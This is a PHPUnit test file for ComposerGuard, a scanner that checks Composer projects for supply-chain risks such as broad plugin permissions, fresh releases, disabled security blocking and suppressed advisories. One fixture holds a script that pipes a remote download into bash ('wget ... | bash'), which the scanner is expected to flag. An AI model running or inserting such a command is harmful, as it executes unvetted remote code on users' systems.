<?php

declare(strict_types=1);

namespace ComposerGuard\Tests;

use ComposerGuard\Checks;
use ComposerGuard\Finding;
use ComposerGuard\Project;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

final class ChecksTest extends TestCase
{
    private static function now(): \DateTimeImmutable
    {
        return new \DateTimeImmutable('2026-10-25T00:00:00+00:00');
    }

    /** @return list<string> */
    private static function ids(Project $p, int $minAge = 7): array
    {
        return array_map(static fn (Finding $f): string => "{$f->checkId}:{$f->line}", (new Checks($minAge, self::now()))->run($p));
    }

    /**
     * @param array<string, mixed> $json
     * @param array<string, mixed>|null $lock
     */
    private static function project(array $json, ?array $lock = null): Project
    {
        $enc = static fn (array $a): string => json_encode($a, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);

        return new Project('composer.json', $enc($json), $lock === null ? null : 'composer.lock', $lock === null ? '' : $enc($lock));
    }

    public function testFindsEveryPlantedProblem(): void
    {
        $p = Project::load(__DIR__ . '/fixtures/risky', 'risky');
        self::assertSame(
            ['CG005:10', 'CG003:18', 'CG004:19', 'CG008:22', 'CG007:6', 'CG005:13', 'CG002:15', 'CG013:3', 'CG006:20', 'CG007:27'],
            self::ids($p),
        );
    }

    public function testCleanProjectHasNoFindings(): void
    {
        self::assertSame([], self::ids(Project::load(__DIR__ . '/fixtures/clean', 'clean')));
    }

    public function testPluginReleaseIsHighAndLibraryMedium(): void
    {
        $findings = (new Checks(7, self::now()))->run(Project::load(__DIR__ . '/fixtures/risky', 'risky'));
        $fresh = array_values(array_filter($findings, static fn (Finding $f): bool => $f->checkId === 'CG007'));
        self::assertSame(['high', 'medium'], array_map(static fn (Finding $f): string => $f->severity->value, $fresh));
        self::assertStringContainsString('less than a day ago and is a Composer plugin', $fresh[0]->message);
        self::assertStringContainsString('composer update --with "monolog/monolog:<3.9.0"', $fresh[1]->help);
    }

    public function testCooldownIsConfigurable(): void
    {
        $p = Project::load(__DIR__ . '/fixtures/risky', 'risky');
        self::assertNotContains('CG007:27', self::ids($p, 2));
        self::assertContains('CG007:27', self::ids($p, 4));
    }

    /** @return iterable<string, array{mixed, list<string>}> */
    public static function allowPlugins(): iterable
    {
        yield 'true' => [true, ['CG001']];
        yield 'star' => [['*' => true], ['CG001']];
        yield 'vendor wildcard' => [['acme/*' => true], ['CG002']];
        yield 'disallowed wildcard' => [['acme/*' => false], []];
        yield 'named' => [['composer/installers' => true], []];
        yield 'false' => [false, []];
    }

    /** @param list<string> $want */
    #[DataProvider('allowPlugins')]
    public function testAllowPlugins(mixed $allow, array $want): void
    {
        $ids = array_map(static fn (string $s): string => explode(':', $s)[0], self::ids(self::project(['config' => ['allow-plugins' => $allow]])));
        self::assertSame($want, $ids);
    }

    public function testUnreadableTimesAndBranchesAreNotAged(): void
    {
        $p = self::project([], ['packages' => [
            ['name' => 'a/b', 'version' => '1.0.0', 'time' => 'not a date'],
            ['name' => 'a/c', 'version' => 'dev-main', 'time' => '2026-10-24T00:00:00+00:00'],
            ['name' => 'a/d', 'version' => '1.0.0'],
            ['name' => 'roave/security-advisories', 'version' => 'dev-latest'],
            'not a package',
        ], 'packages-dev' => 'nope']);
        self::assertSame(['CG006:9'], self::ids($p));
    }

    public function testSingleStringScriptsAreChecked(): void
    {
        $p = self::project(['scripts' => ['setup' => 'wget -qO- https://x.example/i.sh | bash', 'test' => 'phpunit']]);
        self::assertSame(['CG008:3'], self::ids($p));
    }

    /** @return iterable<string, array{array<string, mixed>, list<string>}> */
    public static function stability(): iterable
    {
        yield 'dev without prefer-stable' => [['minimum-stability' => 'dev'], ['CG009']];
        yield 'beta with prefer-stable false' => [['minimum-stability' => 'beta', 'prefer-stable' => false], ['CG009']];
        yield 'RC in upper case' => [['minimum-stability' => 'RC'], ['CG009']];
        yield 'dev with prefer-stable' => [['minimum-stability' => 'dev', 'prefer-stable' => true], []];
        yield 'stable' => [['minimum-stability' => 'stable'], []];
        yield 'not set' => [[], []];
    }

    /**
     * @param array<string, mixed> $json
     * @param list<string> $want
     */
    #[DataProvider('stability')]
    public function testMinimumStability(array $json, array $want): void
    {
        self::assertSame($want, array_map(static fn (string $s): string => explode(':', $s)[0], self::ids(self::project($json))));
    }

    public function testNonCanonicalRepositories(): void
    {
        $p = self::project(['repositories' => [
            ['type' => 'composer', 'url' => 'https://repo.acme.example', 'canonical' => false],
            ['type' => 'vcs', 'url' => 'https://github.com/acme/a', 'canonical' => true],
            ['type' => 'composer', 'url' => 'https://repo2.acme.example', 'only' => ['acme/*']],
            ['type' => 'package', 'package' => ['name' => 'acme/b', 'version' => '1.0.0'], 'canonical' => false],
        ]]);
        self::assertSame(['CG010:6', 'CG010:26'], self::ids($p));
    }

    /** @return iterable<string, array{array<string, mixed>, list<string>}> */
    public static function blocking(): iterable
    {
        yield 'policy off' => [['policy' => false, 'audit' => ['block-insecure' => false]], ['CG011:high']];
        yield 'advisories off' => [['policy' => ['advisories' => false]], ['CG011:high']];
        yield 'advisory blocking off' => [['policy' => ['advisories' => ['audit' => 'fail', 'block' => false]]], ['CG011:high']];
        yield 'deprecated block-insecure' => [['audit' => ['block-insecure' => false]], ['CG011:high']];
        yield 'malware off' => [['policy' => ['malware' => false]], ['CG011:high']];
        yield 'malware blocking off' => [['policy' => ['malware' => ['block' => false]]], ['CG011:high']];
        yield 'malware blocked on update only' => [['policy' => ['malware' => ['block-scope' => 'update']]], ['CG011:medium']];
        yield 'defaults spelled out' => [['policy' => ['advisories' => ['block' => true], 'malware' => ['block' => true, 'block-scope' => 'all']], 'audit' => ['block-insecure' => true]], []];
        yield 'abandoned blocking is opt-in' => [['policy' => ['abandoned' => false]], []];
    }

    /**
     * @param array<string, mixed> $config
     * @param list<string> $want
     */
    #[DataProvider('blocking')]
    public function testSecurityBlocking(array $config, array $want): void
    {
        $findings = (new Checks(7, self::now()))->run(self::project(['config' => $config]));
        self::assertSame($want, array_map(static fn (Finding $f): string => "{$f->checkId}:{$f->severity->value}", $findings));
    }

    public function testBlockingFindingPointsAtTheKey(): void
    {
        $p = self::project(['config' => ['policy' => ['advisories' => ['ignore-id' => ['GHSA-1' => ['reason' => 'x']], 'block' => false], 'malware' => ['block' => false]]]]);
        self::assertSame(['CG011:10', 'CG011:13'], self::ids($p));
    }

    /** @return iterable<string, array{array<string, mixed>, list<string>}> */
    public static function suppressed(): iterable
    {
        yield 'audit reports only' => [['policy' => ['advisories' => ['audit' => 'report']]], ['CG012:medium']];
        yield 'malware audit ignored' => [['policy' => ['malware' => ['audit' => 'ignore']]], ['CG012:medium']];
        yield 'audit fails' => [['policy' => ['advisories' => ['audit' => 'fail'], 'malware' => ['audit' => 'fail']]], []];
        yield 'severity list' => [['policy' => ['advisories' => ['ignore-severity' => ['low', 'medium']]]], ['CG012:medium']];
        yield 'deprecated severity map' => [['audit' => ['ignore-severity' => ['low' => ['apply' => 'audit']]]], ['CG012:medium']];
        yield 'malware ignore' => [['policy' => ['malware' => ['ignore' => ['acme/a' => 'false positive'], 'ignore-source' => ['https://x.example']]]], ['CG012:medium', 'CG012:medium']];
        yield 'ids without reason' => [['policy' => ['advisories' => ['ignore-id' => ['CVE-2026-1' => null, 'GHSA-xxxx' => ['on-audit' => false], 'PKSA-1' => '']]]], ['CG012:low', 'CG012:low', 'CG012:low']];
        yield 'ids as a list' => [['audit' => ['ignore' => ['CVE-2026-1', 'CVE-2026-2']]], ['CG012:low', 'CG012:low']];
        yield 'ids with reasons' => [['policy' => ['advisories' => [
            'ignore-id' => ['CVE-2026-1' => 'not reachable', 'GHSA-xxxx' => ['reason' => 'dev only', 'on-block' => false]],
            'ignore' => ['acme/a' => [['constraint' => '<2', 'reason' => 'pinned'], ['constraint' => '>=3', 'reason' => 'patched']]],
        ]], 'audit' => ['ignore' => ['CVE-2026-2' => ['apply' => 'audit', 'reason' => 'fixed upstream']]]], []];
        yield 'one rule without reason' => [['policy' => ['advisories' => ['ignore' => ['acme/a' => [['reason' => 'x'], ['constraint' => '<1']]]]]], ['CG012:low']];
        yield 'policy off is CG011 only' => [['policy' => false], ['CG011:high']];
    }

    /**
     * @param array<string, mixed> $config
     * @param list<string> $want
     */
    #[DataProvider('suppressed')]
    public function testSuppressedAdvisories(array $config, array $want): void
    {
        $findings = (new Checks(7, self::now()))->run(self::project(['config' => $config]));
        self::assertSame($want, array_map(static fn (Finding $f): string => "{$f->checkId}:{$f->severity->value}", $findings));
    }

    public function testSuppressedAdvisoryPointsAtTheEntry(): void
    {
        $p = self::project(['config' => ['policy' => ['advisories' => ['ignore-id' => ['CVE-2026-1' => 'ok', 'CVE-2026-2' => null]]]]]);
        $findings = (new Checks(7, self::now()))->run($p);
        self::assertCount(1, $findings);
        self::assertSame(7, $findings[0]->line);
        self::assertSame('advisory CVE-2026-2 is ignored without a reason (config.policy.advisories.ignore-id)', $findings[0]->message);
    }

    public function testLockFileFreshness(): void
    {
        $json = ['name' => 'acme/app', 'require' => ['php' => '>=8.2'], 'config' => ['platform' => ['php' => '8.2.0'], 'sort-packages' => true], 'scripts' => ['test' => 'phpunit']];
        $hash = (new Project('composer.json', json_encode($json, JSON_THROW_ON_ERROR)))->contentHash();
        self::assertSame([], self::ids(self::project($json, ['content-hash' => $hash, 'packages' => []])));

        // Keys that do not affect resolution (scripts, other config) may change freely.
        $edited = [...$json, 'scripts' => ['test' => 'phpunit --testdox'], 'config' => ['platform' => ['php' => '8.2.0']]];
        self::assertSame([], self::ids(self::project($edited, ['content-hash' => $hash, 'packages' => []])));

        $bumped = [...$json, 'require' => ['php' => '>=8.3']];
        self::assertSame(['CG013:2'], self::ids(self::project($bumped, ['content-hash' => $hash, 'packages' => []])));
        $platform = [...$json, 'config' => ['platform' => ['php' => '8.3.0']]];
        self::assertSame(['CG013:2'], self::ids(self::project($platform, ['content-hash' => $hash, 'packages' => []])));

        // Very old lock files only have "hash" (of the whole file); Composer compares that differently.
        self::assertSame([], self::ids(self::project($bumped, ['hash' => 'abc', 'packages' => []])));
    }
}
